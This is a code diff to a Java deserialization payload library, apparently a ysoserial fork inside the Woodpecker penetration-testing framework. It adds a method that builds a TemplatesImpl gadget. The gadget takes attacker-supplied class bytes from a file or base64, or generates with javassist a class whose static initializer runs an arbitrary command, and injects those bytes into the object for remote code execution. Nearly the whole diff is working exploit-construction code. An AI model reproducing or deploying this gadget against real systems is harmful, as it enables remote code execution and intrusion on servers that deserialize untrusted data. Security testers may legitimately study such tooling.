@@ -3,18 +3,13 @@ package me.gv7.woodpecker.yso.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
+import java.io.IOException;
 import java.io.Serializable;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Proxy;
+import java.lang.reflect.*;
 import java.util.HashMap;
 import java.util.Map;
 
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
+import javassist.*;
 
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
@@ -102,6 +97,7 @@ public class Gadgets {
         }
 
         return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+        //return createCompressTemplatesImpl(command);
     }
 
 
@@ -142,6 +138,31 @@ public class Gadgets {
         return templates;
     }
 
+
+    public static Object createCompressTemplatesImpl(final String command) throws Exception {
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        byte[] classBytes = null;
+
+        if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CLASS_FILE)){
+            classBytes = CommonUtil.readFileByte(command.substring(CustomCommand.COMMAND_CLASS_FILE.length()));
+        }else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CLASS_BASE64)){
+            classBytes = new BASE64Decoder().decodeBuffer(command.substring(CustomCommand.COMMAND_CLASS_BASE64.length()));
+        } else {
+            ClassPool classPool = ClassPool.getDefault();
+            classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+            CtClass clazz = classPool.makeClass("C" + System.nanoTime());
+            String code = TemplatesImplUtil.getCmd(command);
+            clazz.makeClassInitializer().insertAfter(code);
+            CtClass superC = classPool.get(AbstractTranslet.class.getName());
+            clazz.setSuperclass(superC);
+            classBytes = clazz.toBytecode();
+        }
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
+        Reflections.setFieldValue(templates, "_name", "P");
+        return templates;
+    }
 
     public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
             IllegalAccessException, InvocationTargetException {
